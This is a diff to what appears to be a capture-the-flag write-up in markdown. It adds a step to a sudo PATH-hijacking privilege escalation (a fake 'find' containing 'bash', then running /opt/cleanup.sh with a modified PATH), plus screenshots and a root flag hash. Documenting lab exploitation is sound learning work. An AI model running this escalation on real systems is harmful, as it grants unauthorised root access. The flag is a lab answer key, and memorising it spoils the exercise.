@@ -138,6 +138,7 @@ e89b54a9041e03ea2ea5148f38d1413d
 ```
 sudo -l # check our available command
 echo bash > find
+chmod +x find
 sudo PATH=$PWD:$PATH /opt/cleanup.sh
 ```
 
@@ -146,8 +147,20 @@ sudo PATH=$PWD:$PATH /opt/cleanup.sh
 ![image](https://user-images.githubusercontent.com/70703371/211244753-c2b12678-a38d-4095-814d-7233d2824785.png)
 
 
+![image](https://user-images.githubusercontent.com/70703371/211275027-a030bb8e-fe63-423f-8feb-fcf6428107a2.png)
 
 
+![image](https://user-images.githubusercontent.com/70703371/211275088-aa48c39a-5569-4527-a8a7-5f36333ccd54.png)
+
+
+20. Got the root flag!
+
+
+## ROOT FLAG
+
+```
+09472dbb86cfe57789293cef8965aa07
+```
 
 
 
